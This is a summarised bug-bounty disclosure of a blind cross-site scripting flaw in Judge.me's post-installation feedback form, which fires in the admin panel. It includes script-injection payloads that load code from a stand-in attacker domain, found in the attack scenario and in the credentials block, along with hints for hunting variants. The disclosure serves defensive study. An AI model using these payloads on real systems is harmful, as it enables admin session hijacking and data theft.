# Blind XSS via Feedback Form in Judge.me Admin Panel

## Metadata
- **Source:** HackerOne
- **Report:** 1339034 | https://hackerone.com/reports/1339034
- **Submitted:** 2021-09-14
- **Reporter:** b3hlull
- **Program:** Judge.me
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Blind XSS, Input Validation Failure
- **CVEs:** None
- **Category:** web-api

## Summary
A blind XSS vulnerability was discovered in the Judge.me feedback form that triggers when admins review negative widget installation feedback. The vulnerability allows arbitrary JavaScript execution in the admin panel (requiring HTTP Basic Authentication) with a 20-30 minute delay before payload execution.

## Attack scenario
1. Attacker logs into a Shopify test store and navigates to Judge.me app installation
2. During post-installation feedback, attacker selects 'No, please remove all widgets' option
3. Attacker submits a malicious XSS payload (e.g., ><script src=https://attacker.com></script>) in the feedback form
4. Judge.me stores the unsanitized feedback in backend database
5. Admin user accesses Judge.me admin panel and reviews the negative feedback submission
6. Payload executes in admin browser context (20-30 minutes later), allowing cookie theft, session hijacking, or sensitive data exfiltration

## Root cause
Lack of input sanitization and output encoding on user-submitted feedback text that is displayed in the admin panel. The application failed to properly escape or filter HTML/JavaScript characters before storing and rendering feedback.

## Attacker mindset
Attacker recognized that feedback forms are often reviewed by administrators and that admin panels handle sensitive data. By crafting a blind XSS payload, they could achieve code execution in a privileged context without immediate feedback, targeting backend admin functionality rather than end-user interfaces.

## Defensive takeaways
- Implement strict input validation and sanitization on all user-submitted feedback and comments
- Apply proper output encoding (HTML entity encoding) when rendering user-supplied content in admin panels
- Use Content Security Policy (CSP) headers to restrict script execution sources
- Implement HttpOnly and Secure flags on authentication cookies to prevent JavaScript access
- Conduct security testing on all admin-facing forms and feedback mechanisms
- Use templating engines with automatic XSS protection enabled
- Log and monitor access to admin panels for suspicious activity patterns

## Variant hunting
Test other feedback/contact forms on the platform for similar blind XSS
Check email notification content - if feedback triggers admin emails, XSS may execute there too
Examine comment systems, review responses, and support ticket replies for blind XSS
Test feedback forms with polyglot payloads and event handler variations
Check if feedback can be submitted via API endpoints with different content-type headers

## MITRE ATT&CK
- T1190
- T1566
- T1598

## Notes
This is a delayed/blind XSS with a 20-30 minute trigger window, making it less obvious to detect through normal testing. The vulnerability requires admin action (reviewing feedback) to trigger, which may have affected its severity scoring. The attacker could not obtain session cookies directly but could access the admin panel content, suggesting the HTTP Basic Auth may have been cached or the XSS executed in an admin session context.

## Full report
<details><summary>Expand</summary>

## Summary:

Hi Team,

 I found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.

## Steps To Reproduce:

  1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.** (credentials in the Credentials Header)**
  1. Click the **Apps** tab from the left side and then click **Judge.me Product Reviews**.
  1. Click** Add Widgets** then **Start Installation** and continue.
  1. When the installation is done. It asks **Are you happy with how everything looks?**. Choose  **No, please remove all widgets button**. Feedback form appears and put your blind xss payload.
  1. Wait for payload triggering.

## Supporting Material/References:

Vulnerable Page URL : https://judge.me/admin/████████
Referer: https://judge.me/admin/███

Cookies:```http
██████████████ ```


## Credentials

```http
email:  ██████████@yopmail.com
password: ███████
tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

 Admin Page
=====================
█████
Vulnerable Page
=====================
███████ 
Steps to Reproduce Video
=====================
████

## Impact

Blind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.

</details>

---
*Analysed by Claude on 2026-05-12*
